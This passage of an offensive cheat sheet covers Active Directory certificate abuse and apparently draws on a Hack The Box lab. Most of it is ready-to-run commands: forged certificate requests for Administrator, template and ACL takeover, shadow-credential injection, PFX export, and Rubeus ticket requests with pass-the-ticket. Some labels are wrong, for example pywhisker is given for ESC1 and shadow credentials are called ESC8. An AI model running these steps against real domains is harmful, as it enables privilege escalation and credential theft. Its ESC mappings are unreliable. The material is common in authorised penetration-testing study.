### 🛠 Tools
- `Certify.exe` (from GhostPack)
- `certipy` (`certipy find`)
- `pywhisker.py` (`-a list`)
- `ADCSKiller` (for quick checks)

### 🔑 Key Output
- Vulnerable templates (e.g., `ESC1–ESC8`)
- Templates with `ENROLLEE_SUPPLIES_SUBJECT`
- Permissions like `Enroll`, `WriteOwner`, `AddKeyCredentialLink`

## 🔐 2. **Certificate Template Abuses**

### ▶️ Scenario: You Have `Enroll` & `ENROLLEE_SUPPLIES_SUBJECT`
**Attack Type: ESC1**
✅ Use **pywhisker** or **certipy**:
```bash
pywhisker.py -a add -t TARGET.USER -d domain.local -u youruser -H :NTLMHASH --dc-ip DC_IP
```
Or with certipy:
```bash
certipy req -u youruser -p yourpass -ca CA_NAME -template TEMPLATE -target TARGET.USER
```

### ▶️ Scenario: You Have Write/Control Over Template
**Attack Type: ESC2/ESC3/ESC4**
- Modify the template (add low-priv user to `Enroll`, enable `ENROLLEE_SUPPLIES_SUBJECT`)
```powershell
Set-ADObject -Identity "CN=TEMPLATE,...DN..." -Add @{pKIExtendedKeyUsage="1.3.6.1.5.5.7.3.2"}
```
Enroll with `certipy` or `pywhisker`

## 🧬 3. **Shadow Credentials (ESC8)**

You can use `AddKeyCredentialLink` to add your own certificate to a user.
```bash
pywhisker.py -a add -t victim.user -d domain -u youruser -H :NTLMHASH --dc-ip DC
```
✅ Output: **.pfx file** — extract TGT!


## 🛠 4. **Manipulate ACLs to Gain Access**
### Privileges:
- `GenericAll`, `WriteOwner`, `WriteDACL`, `WriteProperty`
✅ Tool: `dacledit.py` or `owneredit.py`

```bash
owneredit.py domain/user -target-dn "CN=...,DC=..." -new-owner attackeruser -action write
dacledit.py domain/user -target-dn "..." -action write -principal attackeruser -rights WriteOwner
```
Once you’re `Owner` or have `WriteDACL`, add `Enroll` permissions.

## 🏆 5. **Retrieve and Use TGT (or TGS)**
### 🔑 If You Have a .pfx or .pem Certificate
#### ✅ Use `Rubeus` to Request a TGT:
```bash
Rubeus.exe asktgt /user:Administrator /certificate:cert.pem /domain:haze.htb /ptt
```
✅ Or with `certipy`:
```bash
certipy auth -pfx user.pfx -domain haze.htb -dc-ip 10.10.11.61
```

## 📁 6. **Alternative Tools**

| Tool         | Use Case                         | Notes                                 |
| ------------ | -------------------------------- | ------------------------------------- |
| `certipy`    | End-to-end AD CS attacks         | Great for enumeration & TGT retrieval |
| `pywhisker`  | Python-based cert abuse          | Good for Linux workflows              |
| `Rubeus`     | TGT/TGS abuse via certs          | Requires Windows                      |
| `certutil`   | Enroll manually if access allows | Limited for abuse, but useful         |
| `SharpHound` | Find ACLs, rights & delegation   | Great for context                     |

## 🎯 Prioritizing Attack Paths

|Privilege You Have|Next Step|
|---|---|
|`Enroll` + misconfigured template|ESC1-style attack with `certipy` or `pywhisker`|
|`WriteDACL`/`WriteOwner` on template|Grant yourself `Enroll`, abuse ESC4|
|`AddKeyCredentialLink` on user|Shadow Credentials with `pywhisker`|
|`GenericAll` on user|Reset password or ShadowCreds|
|`DCSync` via ACLs|Dump hashes with `secretsdump.py`|
|PFX / PEM|Get TGT via `Rubeus` or `certipy`|
#### Build-in Windows tool certutil
Check all current templates: `certutil -config - -catemplates`
Create a request.inf file, change the Subject CN and UPN and CertificateTemplate
```
[Version]
Signature="$Windows NT$"

[NewRequest]
Subject = "CN=Administrator"
KeySpec = 1
KeyLength = 2048
Exportable = TRUE
MachineKeySet = FALSE
SMIME = FALSE
PrivateKeyArchive = FALSE
UserProtected = FALSE
ProviderName = "Microsoft RSA SChannel Cryptographic Provider"
ProviderType = 12
RequestType = PKCS10
KeyUsage = 0xa0

[Extensions]
2.5.29.17 = "{text}"
_continue_ = "upn=Administrator@haze.htb"

[RequestAttributes]
CertificateTemplate = EFS
```
Create a new request: ` certreq -submit -config "dc01.haze.htb\haze-DC01-CA" request.req cert.cer` (Find the full CA from `Certify.exe find /enrollee`)
Accept the certificate: `certreq -accept cert.cer`
Export to .PFX using PowerShell:
```PowerShell
$cert = Get-ChildItem -Path Cert:\CurrentUser\My | Where-Object { $_.Subject -eq "CN=victimUser" }
$cert | Export-PfxCertificate -FilePath victim.pfx -Password (ConvertTo-SecureString -String 'P@ssw0rd!' -Force -AsPlainText)
```
Use Rubeus to get TGT from PFX:
```
Rubeus.exe asktgt /user:victimUser /domain:domain.local /certificate:FILE:victim.pfx /password:P@ssw0rd! /outfile:victim.kirbi
```
Can also convert to Base64 first:
```bash
base64 -w 0 victim.pfx
```
Then pass it to Rubeus:
```
Rubeus.exe asktgt /user:victimUser /domain:domain.local /certificate:BASE64:<bigbase64string> /password:P@ssw0rd! /outfile:victim.kirbi
```
Verify it and inject into memory:
```
Rubeus.exe ptt /ticket:victim.kirbi
```